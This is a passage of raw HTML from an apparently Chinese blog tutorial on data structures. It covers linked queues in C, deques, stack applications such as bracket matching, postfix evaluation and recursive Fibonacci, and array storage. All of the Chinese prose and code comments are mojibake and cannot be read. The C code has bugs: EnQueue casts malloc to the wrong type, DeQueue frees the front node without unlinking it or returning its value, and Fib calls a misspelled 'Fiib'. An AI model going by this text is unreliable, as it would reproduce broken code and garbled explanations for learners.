class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®ç°å…¥é˜Ÿçš„å‡½æ•°</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">EnQueue</span><span class="params">(LinkQueue Q,<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    LinkNode *s = (LinkQueue)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkNode));</span><br><span class="line">    s-&gt;data = x;</span><br><span class="line">    s-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    Q-&gt;rear-&gt;next = s;</span><br><span class="line">    Q-&gt;rear = s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4å‡ºé˜Ÿ"><a class="markdownIt-Anchor" href="#4å‡ºé˜Ÿ">#</a> ï¼ˆ4ï¼‰å‡ºé˜Ÿ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdlib.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LinkNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    LinkNode *front,*rear;</span><br><span class="line">&#125;*LinkQueue;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitQueue</span><span class="params">(LinkQueue Q)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">IsEmpty</span><span class="params">(LinkQueue Q)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">EnQueue</span><span class="params">(LinkQueue Q,<span class="type">int</span> x)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">DeQueue</span><span class="params">(LinkQueue Q,<span class="type">int</span> *x)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®ç°åˆå§‹åŒ–é˜Ÿåˆ—çš„å‡½æ•°</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitQueue</span><span class="params">(LinkQueue Q)</span>&#123;</span><br><span class="line">    Q-&gt;front = Q-&gt;rear =  (LinkNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkNode));  <span class="comment">//å»ºç«‹å¤´ç»“ç‚¹</span></span><br><span class="line">    Q-&gt;front-&gt;next = <span class="literal">NULL</span>;                                           <span class="comment">//åˆå§‹ä¸ºç©º</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®ç°åˆ¤æ–­é˜Ÿç©ºçš„å‡½æ•°</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">IsEmpty</span><span class="params">(LinkQueue Q)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (Q-&gt;front == Q-&gt;rear) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®ç°å…¥é˜Ÿçš„å‡½æ•°</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">EnQueue</span><span class="params">(LinkQueue Q,<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    LinkNode *s = (LinkQueue)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkNode));</span><br><span class="line">    s-&gt;data = x;</span><br><span class="line">    s-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    Q-&gt;rear-&gt;next = s;</span><br><span class="line">    Q-&gt;rear = s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®ç°å‡ºé˜Ÿçš„å‡½æ•°</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">DeQueue</span><span class="params">(LinkQueue Q,<span class="type">int</span> *x)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (Q-&gt;front == Q-&gt;rear) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    LinkNode *p = Q-&gt;front-&gt;next;</span><br><span class="line">    <span class="keyword">if</span> (Q-&gt;rear == p)</span><br><span class="line">        Q-&gt;rear = Q-&gt;front;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    p = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="324-åŒç«¯é˜Ÿåˆ—"><a class="markdownIt-Anchor" href="#324-åŒç«¯é˜Ÿåˆ—">#</a> 3.2.4ã€åŒç«¯é˜Ÿåˆ—ï¼š</h2><p>â€‹åŒç«¯é˜Ÿåˆ—æ˜¯æŒ‡å…è®¸ä¸¤ç«¯éƒ½å¯ä»¥è¿›è¡Œå…¥é˜Ÿå’Œå‡ºé˜Ÿçš„é˜Ÿåˆ—ï¼Œå¦‚ä¸‹å›¾ã€‚å…¶å…ƒç´ çš„é€»è¾‘ç»“æ„ä»æ˜¯çº¿æ€§ç»“æ„ã€‚å°†é˜Ÿåˆ—çš„ä¸¤ç«¯åˆ†åˆ«ç§°ä¸ºå‰ç«¯å’Œåç«¯ï¼Œä¸¤ç«¯éƒ½å¯ä»¥å…¥é˜Ÿå’Œå‡ºé˜Ÿã€‚</p><p><img data-src="https://i-blog.csdnimg.cn/direct/688a5e8549b74b0c8f58c6678f983b4b.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹åœ¨åŒç«¯é˜Ÿåˆ—è¿›é˜Ÿæ—¶ï¼Œå‰ç«¯è¿›çš„å…ƒç´ æ’åˆ—åœ¨é˜Ÿåˆ—ä¸­åæ®µçš„å…ƒç´ çš„å‰é¢ï¼Œåç«¯è¿›çš„å…ƒç´ æ’åˆ—åœ¨é˜Ÿåˆ—ä¸­å‰ç«¯è¿›çš„å…ƒç´ çš„åé¢ã€‚åœ¨åŒç«¯é˜Ÿåˆ—å‡ºé˜Ÿæ—¶ï¼Œæ— è®ºæ˜¯å‰ç«¯è¿˜æ˜¯åç«¯å‡ºé˜Ÿï¼Œå…ˆå‡ºçš„å…ƒç´ æ’åˆ—åœ¨åå‡ºçš„å…ƒç´ çš„å‰é¢ã€‚</p><p>â€‹è¾“å‡ºå—é™çš„åŒç«¯é˜Ÿåˆ—ï¼šå…è®¸åœ¨ä¸€ç«¯è¿›è¡Œæ’å…¥å’Œåˆ é™¤ï¼Œä½†åœ¨å¦ä¸€ç«¯åªå…è®¸æ’å…¥çš„åŒç«¯é˜Ÿåˆ—ç§°ä¸ºè¾“å‡ºå—é™çš„åŒç«¯é˜Ÿä¼ï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/cc2c7aa99a804af7a6faf2612e07bfc2.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹è¾“å…¥å—é™çš„åŒç«¯é˜Ÿåˆ—ï¼šå…è®¸åœ¨ä¸€ç«¯è¿›è¡Œæ’å…¥å’Œåˆ é™¤ï¼Œä½†åœ¨å¦ä¸€ç«¯åªå…è®¸åˆ é™¤çš„åŒç«¯é˜Ÿåˆ—ç§°ä¸ºè¾“å…¥å—é™çš„åŒç«¯é˜Ÿåˆ—ï¼Œå¦‚ä¸‹å›¾ã€‚è‹¥é™å®šåŒç«¯é˜Ÿåˆ—ä»æŸä¸ªç«¯ç‚¹æ’å…¥çš„å…ƒç´ åªèƒ½ä»è¯¥ç«¯ç‚¹åˆ é™¤ï¼Œåˆ™è¯¥åŒç«¯é˜Ÿåˆ—å°±èœ•å˜ä¸ºä¸¤ä¸ªæ ˆåº•ç›¸é‚»æ¥çš„æ ˆã€‚</p><p><img data-src="https://i-blog.csdnimg.cn/direct/9287fdacb0934a54866e1ed4e0578c88.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1 id="33-æ ˆå’Œé˜Ÿåˆ—çš„åº”ç”¨"><a class="markdownIt-Anchor" href="#33-æ ˆå’Œé˜Ÿåˆ—çš„åº”ç”¨">#</a> 3.3ã€æ ˆå’Œé˜Ÿåˆ—çš„åº”ç”¨ï¼š</h1><h2 id="331-æ ˆåœ¨æ‹¬å·åŒ¹é…ä¸­çš„åº”ç”¨"><a class="markdownIt-Anchor" href="#331-æ ˆåœ¨æ‹¬å·åŒ¹é…ä¸­çš„åº”ç”¨">#</a> 3.3.1ã€æ ˆåœ¨æ‹¬å·åŒ¹é…ä¸­çš„åº”ç”¨ï¼š</h2><p>â€‹å‡è®¾è¡¨è¾¾å¼ä¸­å…è®¸åŒ…å«ä¸¤ç§æ‹¬å·ï¼šåœ†æ‹¬å·å’Œæ–¹æ‹¬å·ï¼Œå…¶åµŒå¥—çš„é¡ºåºä»»æ„å³ <code>([] ())</code>  æˆ–  <code>[([][])]</code>  ç­‰å‡ä¸ºæ­£ç¡®çš„æ ¼å¼ï¼Œ <code>[(])</code>  æˆ– <code>([())]</code>  æˆ– <code>(()]</code>  å‡ä¸ºä¸æ­£ç¡®çš„æ ¼å¼ã€‚</p><p>â€‹è€ƒè™‘ä¸‹åˆ—æ‹¬å·åºåˆ—ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/4e69aed09fbd410992af8df3f2df86d1.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹åˆ†æå¦‚ä¸‹ï¼š</p><ol><li>è®¡ç®—æœºæ¥æ”¶ç¬¬ 1 ä¸ªæ‹¬å· â€œ[â€ åï¼ŒæœŸå¾…ä¸ä¹‹åŒ¹é…çš„ç¬¬ 8 ä¸ªæ‹¬å· â€œ]â€ å‡ºç°ã€‚</li><li>è·å¾—äº†ç¬¬ 2 ä¸ªæ‹¬å· â€œ(â€ ï¼Œæ­¤æ—¶ç¬¬ 1 ä¸ªæ‹¬å· â€œ[â€ æš‚æ—¶æ”¾åœ¨ä¸€èµ·ï¼Œè€Œæ€¥è¿«æœŸå¾…ä¸ä¹‹åŒ¹é…çš„ç¬¬ 7 ä¸ªæ‹¬å· â€)â€œ å‡ºç°ã€‚</li><li>è·å¾—äº†ç¬¬ 3 ä¸ªæ‹¬å· â€[â€œï¼Œæ­¤æ—¶ç¬¬ 2 ä¸ªæ‹¬å· â€œ(â€ æš‚æ—¶æ”¾åœ¨ä¸€è¾¹ï¼Œè€Œæ€¥è¿«æœŸå¾…ä¸ä¹‹åŒ¹é…çš„ç¬¬ 4 ä¸ªæ‹¬å· â€œ]â€ å‡ºç°ã€‚ç¬¬ 3 ä¸ªæ‹¬å·çš„æœŸå¾…å¾—åˆ°æ»¡è¶³ï¼Œæ¶ˆè§£ä¹‹åï¼Œç¬¬ 2 ä¸ªæ‹¬å·çš„æœŸå¾…åŒ¹é…åˆæˆä¸ºå½“å‰æœ€æ€¥è¿«çš„ä»»åŠ¡ã€‚</li><li>ï¼›ä»¥æ­¤ç±»æ¨ï¼Œå¯è§è¯¥å¤„ç†è¿‡ç¨‹ä¸æ ˆçš„æ€æƒ³å»åˆã€‚</li></ol><p>â€‹ç®—æ³•çš„æ€æƒ³å¦‚ä¸‹ï¼š</p><ol><li>åˆå§‹è®¾ç½®ä¸€ä¸ªç©ºæ ˆï¼Œé¡ºåºè¯»å…¥æ‹¬å·ã€‚</li><li>è‹¥æ˜¯å³æ‹¬å·ï¼Œåˆ™æˆ–ä½¿ç½®äºæ ˆé¡¶çš„æœ€æ€¥è¿«æœŸå¾…å¾—ä»¥æ¶ˆè§£ï¼Œæˆ–æ˜¯ä¸åˆæ³•çš„æƒ…å†µï¼ˆæ‹¬å·åºåˆ—ä¸åŒ¹é…ï¼Œé€€å‡ºç¨‹åºï¼‰</li><li>è‹¥æ˜¯å·¦æ‹¬å·ï¼Œåˆ™ä½œä¸ºä¸€ä¸ªæ–°çš„æ›´æ€¥è¿«çš„æœŸå¾…å‹å…¥æ ˆä¸­ï¼Œè‡ªç„¶ä½¿åŸæœ‰çš„åœ¨æ ˆä¸­çš„æ‰€æœ‰æœªæ¶ˆè§£çš„æœŸå¾…çš„æ€¥è¿«æ€§é™äº†ä¸€çº§ã€‚ç®—æ³•ç»“æŸæ—¶ï¼Œæ ˆæœªç©ºï¼Œå¦åˆ™æ‹¬å·åºåˆ—ä¸åŒ¹é…ã€‚</li></ol><h2 id="332-æ ˆåœ¨è¡¨è¾¾å¼æ±‚å€¼ä¸­çš„åº”ç”¨"><a class="markdownIt-Anchor" href="#332-æ ˆåœ¨è¡¨è¾¾å¼æ±‚å€¼ä¸­çš„åº”ç”¨">#</a> 3.3.2ã€æ ˆåœ¨è¡¨è¾¾å¼æ±‚å€¼ä¸­çš„åº”ç”¨</h2><p>â€‹è¡¨è¾¾å¼æ±‚å€¼æ˜¯ç¨‹åºè®¾è®¡è¯­è¨€ç¼–è¯‘ä¸­ä¸€ä¸ªæœ€åŸºæœ¬çš„é—®é¢˜ï¼Œå®ƒçš„å®ç°æ˜¯æ ˆåº”ç”¨çš„ä¸€ä¸ªå…¸å‹èŒƒä¾‹ã€‚ä¸­ç¼€è¡¨è¾¾å¼ä¸ä»…ä¾èµ–è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§ï¼Œè€Œä¸”è¿˜è¦å¤„ç†æ‹¬å·ã€‚åç¼€è¡¨è¾¾å¼çš„è¿ç®—ç¬¦åœ¨æ“ä½œæ•°åé¢ï¼Œåœ¨åç¼€è¡¨è¾¾å¼ä¸­å·²è€ƒè™‘äº†è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§ï¼Œæ²¡æœ‰æ‹¬å·ï¼Œåªæœ‰æ“ä½œæ•°å’Œè¿ç®—ç¬¦ã€‚ä¸­ç¼€è¡¨è¾¾å¼ A+B*(C-D)-E/F æ‰€å¯¹åº”çš„åç¼€è¡¨è¾¾å¼ä¸º ABCD-*+EF/-ã€‚</p><p><img data-src="https://i-blog.csdnimg.cn/direct/1d4649050bf0453aac036d3dab4592df.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹é€šè¿‡åç¼€è¡¨è¾¾å¼è®¡ç®—è¡¨è¾¾å¼å€¼çš„è¿‡ç¨‹ä¸ºï¼šé¡ºåºæ‰«æè¡¨è¾¾å¼çš„æ¯ä¸€é¡¹ï¼Œç„¶åæ ¹æ®å®ƒçš„ç±»å‹åšå¦‚ä¸‹ç›¸åº”æ“ä½œï¼šè‹¥è¯¥é¡¹æ˜¯æ“ä½œæ•°ï¼Œåˆ™å°†å…¶å‹å…¥æ ˆä¸­ï¼›è‹¥è¯¥é¡¹æ˜¯æ“ä½œç¬¦ &lt;op&gt;ï¼Œåˆ™è¿ç»­ä»æ ˆä¸­é€€å‡ºä¸¤ä¸ªæ“ä½œæ•° Y å’Œ X ï¼Œå½¢æˆè¿ç®—æŒ‡ä»¤ X&lt;op&gt;Yï¼Œå¹¶å°†è®¡ç®—ç»“æœé‡æ–°å‹å…¥æ ˆä¸­ã€‚å½“è¡¨è¾¾å¼çš„æ‰€æœ‰é¡¹éƒ½æ‰«æå¹¶å¤„ç†å®Œåï¼Œæ ˆé¡¶å­˜æ”¾çš„å°±æ˜¯æœ€åçš„è®¡ç®—ç»“æœã€‚</p><p>â€‹ä¾‹å¦‚ï¼Œåç¼€è¡¨è¾¾å¼ ABCD-*+EF/- æ±‚å€¼çš„è¿‡ç¨‹éœ€è¦ 12 æ­¥ï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/7ba31fee1b684dd283898fd4e5b7c4fc.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="333-æ ˆåœ¨é€’å½’ä¸­çš„åº”ç”¨"><a class="markdownIt-Anchor" href="#333-æ ˆåœ¨é€’å½’ä¸­çš„åº”ç”¨">#</a> 3.3.3ã€æ ˆåœ¨é€’å½’ä¸­çš„åº”ç”¨</h2><p>â€‹é€’å½’æ˜¯ä¸€ç§é‡è¦çš„ç¨‹åºè®¾è®¡æ–¹æ³•ã€‚åŠ å•åœ°è¯´ï¼Œè‹¥åœ¨ä¸€ä¸ªå‡½æ•°ã€è¿‡ç¨‹æˆ–æ•°æ®ç»“æ„çš„å®šä¹‰ä¸­åˆåº”ç”¨äº†å®ƒè‡ªèº«ï¼Œåˆ™è¿™ä¸ªå‡½æ•°ã€è¿‡ç¨‹æˆ–æ•°æ®ç»“æ„ç§°ä¸ºæ˜¯é€’å½’å®šä¹‰çš„ï¼Œç®€ç§°é€’å½’ã€‚</p><p>â€‹å®ƒé€šå¸¸æŠŠä¸€ä¸ªå¤§å‹çš„å¤æ‚é—®é¢˜å±‚å±‚è½¬åŒ–ä¸ºä¸€ä¸ªä¸åŸé—®é¢˜ç›¸ä¼¼çš„è§„æ¨¡è¾ƒå°çš„é—®é¢˜æ¥æ±‚è§£ï¼Œé€’å½’ç­–ç•¥åªéœ€è¦å°‘é‡ä»£ç å°±å¯ä»¥æè¿°å‡ºè§£é¢˜è¿‡ç¨‹æ‰€éœ€è¦çš„å¤šæ¬¡é‡å¤è®¡ç®—ï¼Œå¤§å¤§å‡å°‘äº†ç¨‹åºçš„ä»£ç é‡ã€‚ä½†åœ¨é€šå¸¸æƒ…å†µä¸‹ï¼Œå®ƒçš„æ•ˆç‡å¹¶ä¸æ˜¯å¤ªé«˜ã€‚</p><p>â€‹ä»¥æ–æ³¢é‚£å¥‘æ•°åˆ—ä¸ºä¾‹ï¼Œå…¶å®šä¹‰ä¸ºï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/2687dbe7f9b14f979a452f4c008b052c.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹è¿™å°±æ˜¯é€’å½’çš„ä¸€ä¸ªå…¸å‹ä¾‹å­ï¼Œç”¨ç¨‹åºå®ç°æ—¶å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Fib</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n == <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> Fib(n<span class="number">-1</span>) + Fiib(n<span class="number">-2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å¿…é¡»æ³¨æ„é€’å½’æ¨¡å‹ä¸èƒ½æ˜¯å¾ªç¯å®šä¹‰ï¼Œå…¶å¿…é¡»æ»¡è¶³ä¸‹é¢çš„ä¸¤ä¸ªæ¡ä»¶ï¼š</p><ul><li>é€’å½’è¡¨è¾¾å¼ï¼ˆé€’å½’ä½“ï¼‰</li><li>è¾¹ç•Œæ¡ä»¶</li></ul><p>â€‹é€’å½’çš„ç²¾é«“åœ¨äºèƒ½å¦å°†åŸå§‹é—®é¢˜è½¬æ¢ä¸ºå±æ€§ç›¸åŒä½†è§„æ¨¡è¾ƒå°çš„é—®é¢˜ã€‚</p><p>â€‹åœ¨é€’å½’è°ƒç”¨çš„è¿‡ç¨‹ä¸­ï¼Œç³»ç»Ÿä¸ºæ¯ä¸€å±‚çš„è¿”å›ç‚¹ã€å±€éƒ¨å˜é‡ã€ä¼ å…¥å‚æ•°ç­‰å¼€è¾Ÿäº†é€’å½’å·¥ä½œæ ˆæ¥è¿›è¡Œæ•°æ®å­˜å‚¨ï¼Œé€’å½’æ¬¡æ•°è¿‡å¤šå®¹æ˜“é€ æˆæ ˆæº¢å‡ºç­‰ã€‚è€Œå…¶æ•ˆç‡ä¸é«˜çš„åŸå› æ˜¯é€’å½’è°ƒç”¨è¿‡ç¨‹ä¸­åŒ…å«å¾ˆå¤šé‡å¤çš„è®¡ç®—ã€‚ä¸‹é¢ä»¥ n=5 ä¸ºä¾‹ï¼Œåˆ—å‡ºé€’å½’è°ƒç”¨æ‰§è¡Œè¿‡ç¨‹ï¼Œå¦‚å›¾ 3.16 æ‰€ç¤ºã€‚</p><p>â€‹æ˜¾ç„¶ï¼Œåœ¨é€’å½’è°ƒç”¨çš„è¿‡ç¨‹ä¸­ï¼ŒFib (3) è¢«è®¡ç®—äº† 2 æ¬¡ï¼ŒFib (2) è¢«è®¡ç®—äº† 3 æ¬¡ã€‚Fib (1) è¢«è°ƒç”¨äº† 5 æ¬¡ï¼ŒFib (0) è¢«è°ƒç”¨äº† 3 æ¬¡ã€‚æ‰€ä»¥ï¼Œé€’å½’çš„æ•ˆç‡ä½ä¸‹ï¼Œä½†ä¼˜ç‚¹æ˜¯ä»£ç ç®€å•ï¼Œå®¹æ˜“ç†è§£ã€‚<br><img data-src="https://i-blog.csdnimg.cn/direct/07312c9b322744598548511bd5dbfb81.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="334-é˜Ÿåˆ—åœ¨å±‚æ¬¡éå†ä¸­çš„åº”ç”¨"><a class="markdownIt-Anchor" href="#334-é˜Ÿåˆ—åœ¨å±‚æ¬¡éå†ä¸­çš„åº”ç”¨">#</a> 3.3.4ã€é˜Ÿåˆ—åœ¨å±‚æ¬¡éå†ä¸­çš„åº”ç”¨</h2><p>â€‹åœ¨ä¿¡æ¯å¤„ç†ä¸­åˆä¸€å¤§å †é—®é¢˜éœ€è¦é€å±‚æˆ–é€è¡Œå¤„ç†ã€‚è¿™ç±»é—®é¢˜çš„è§£å†³æ–¹æ³•å¾€å¾€æ˜¯åœ¨å¤„ç†å½“å‰å±‚æˆ–å½“å‰è¡Œæ—¶å°±å¯¹ä¸‹ä¸€å±‚æˆ–ä¸‹ä¸€è¡Œåšé¢„å¤„ç†ï¼ŒæŠŠå¤„ç†é¡ºåºå®‰æ’å¥½ï¼Œç­‰åˆ°å½“å‰å±‚æˆ–å½“å‰è¡Œå¤„ç†å®Œæ¯•ï¼Œå°±å¯ä»¥å¤„ç†ä¸‹ä¸€å±‚æˆ–ä¸‹ä¸€è¡Œã€‚ä½¿ç”¨é˜Ÿåˆ—æ—¶ä¸ºäº†ä¿å­˜ä¸‹ä¸€æ­¥çš„å¤„ç†é¡ºåºã€‚</p><h2 id="335-é˜Ÿåˆ—åœ¨è®¡ç®—æœºç³»ç»Ÿä¸­çš„åº”ç”¨"><a class="markdownIt-Anchor" href="#335-é˜Ÿåˆ—åœ¨è®¡ç®—æœºç³»ç»Ÿä¸­çš„åº”ç”¨">#</a> 3.3.5ã€é˜Ÿåˆ—åœ¨è®¡ç®—æœºç³»ç»Ÿä¸­çš„åº”ç”¨</h2><p>â€‹é˜Ÿåˆ—åœ¨è®¡ç®—æœºç³»ç»Ÿä¸­ç­‰åº”ç”¨éå¸¸å¹¿æ³›ï¼Œä¸¤ä¸ªä¾‹å­ï¼šç¬¬ä¸€ä¸ªæ—¶ç»“å±€ä¸»æœºä¸å¤–éƒ¨è®¾å¤‡ä¹‹é—´é€Ÿåº¦ä¸åŒ¹é…çš„é—®é¢˜ï¼Œç¬¬äºŒä¸ªæ–¹é¢æ—¶è§£å†³ç”±å¤šç”¨æˆ·å¼•èµ·çš„èµ„æºç«äº‰é—®é¢˜ã€‚</p><h1 id="34-æ•°ç»„å’Œç‰¹æ®ŠçŸ©é˜µ"><a class="markdownIt-Anchor" href="#34-æ•°ç»„å’Œç‰¹æ®ŠçŸ©é˜µ">#</a> 3.4ã€æ•°ç»„å’Œç‰¹æ®ŠçŸ©é˜µ</h1><p>â€‹çŸ©é˜µåœ¨è®¡ç®—æœºå›¾å½¢å­¦ã€å·¥ç¨‹è®¡ç®—ä¸­å æœ‰ä¸¾è¶³è½»é‡çš„åœ°ä½ã€‚åœ¨æ•°æ®ç»“æ„ä¸­è€ƒè™‘çš„æ˜¯å¦‚ä½•ç”¨æœ€å°çš„å†…å­˜ç©ºé—´æ¥å­˜å‚¨åŒæ ·çš„ä¸€ç»„æ•°æ®ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬ä¸ç ”ç©¶çŸ©é˜µåŠå…¶è¿ç®—ç­‰ï¼Œè€ŒæŠŠç²¾åŠ›æ”¾åœ¨å¦‚ä½•å°†çŸ©é˜µæ›´æœ‰æ•ˆåœ°å­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œå¹¶èƒ½æ–¹ä¾¿åœ°æå–çŸ©é˜µä¸­çš„å…ƒç´ ã€‚</p><h2 id="341-æ•°ç»„çš„å®šä¹‰"><a class="markdownIt-Anchor" href="#341-æ•°ç»„çš„å®šä¹‰">#</a> 3.4.1ã€æ•°ç»„çš„å®šä¹‰</h2><p>â€‹æ•°ç»„æ˜¯ç”± n (n&gt;=1) ä¸ªç›¸åŒç±»å‹çš„æ•°æ®å…ƒç´ æ„æˆçš„æœ‰é™åºåˆ—ï¼Œæ¯ä¸ªæ•°æ®å…ƒç´ ç§°ä¸ºä¸€ä¸ªæ•°ç»„å…ƒç´ ï¼Œæ¯ä¸ªå…ƒç´ åœ¨ n ä¸ªçº¿æ€§å…³ç³»ä¸­çš„åºå·ç§°ä¸ºè¯¥å…ƒç´ çš„ä¸‹æ ‡ï¼Œä¸‹æ ‡çš„å–å€¼èŒƒå›´ç§°ä¸ºæ•°ç»„çš„ç»´ç•Œã€‚</p><p>â€‹æ•°ç»„ä¸çº¿æ€§è¡¨çš„å…³ç³»ï¼šæ•°ç»„æ˜¯çº¿æ€§è¡¨çš„æ¨å¹¿ã€‚ä¸€ç»´æ•°ç»„å¯è§†ä¸ºä¸€ä¸ªçº¿æ€§è¡¨ï¼›äºŒç»´æ•°ç»„å¯è§†ä¸ºå…¶å…ƒç´ ä¹Ÿæ˜¯å®šé•¿çº¿æ€§è¡¨çš„çº¿æ€§è¡¨ï¼Œä»¥æ­¤ç±»æ¨ã€‚æ•°ç»„ä¸€æ—¦è¢«å®šä¹‰ï¼Œå…¶ç»´æ•°å’Œç»´ç•Œå°±ä¸å†æ”¹å˜ã€‚å› æ­¤ï¼Œé™¤ç»“æ„çš„åˆå§‹åŒ–å’Œé”€æ¯å¤–ï¼Œæ•°ç»„åªä¼šæœ‰å­˜å–å…ƒç´ å’Œä¿®æ”¹å…ƒç´ çš„æ“ä½œã€‚</p><h2 id="342-æ•°ç»„çš„å­˜å‚¨ç»“æ„"><a class="markdownIt-Anchor" href="#342-æ•°ç»„çš„å­˜å‚¨ç»“æ„">#</a> 3.4.2ã€æ•°ç»„çš„å­˜å‚¨ç»“æ„</h2><p>â€‹å¤§å¤šæ•°è®¡ç®—æœºè¯­è¨€éƒ½æä¾›äº†æ•°ç»„æ•°æ®ç±»å‹ï¼Œé€»è¾‘æ„ä¹‰ä¸Šçš„æ•°ç»„å¯é‡‡ç”¨è®¡ç®—æœºè¯­è¨€ä¸­çš„æ•°ç»„æ•°æ®ç±»å‹è¿›è¡Œå­˜å‚¨ï¼Œä¸€ä¸ªæ•°ç»„çš„æ‰€æœ‰å…ƒç´ çš„å†…å­˜ä¸­å ç”¨ä¸€æ®µè¿ç»­çš„å­˜å‚¨ç©ºé—´ã€‚</p><p>â€‹ä»¥ä¸€ç»´æ•°ç»„ A [0â€¦n-1] ä¸ºä¾‹ï¼Œå…¶å­˜å‚¨ç»“æ„å…³ç³»å¼ä¸º</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>L</mi><mi>O</mi><mi>C</mi><mo 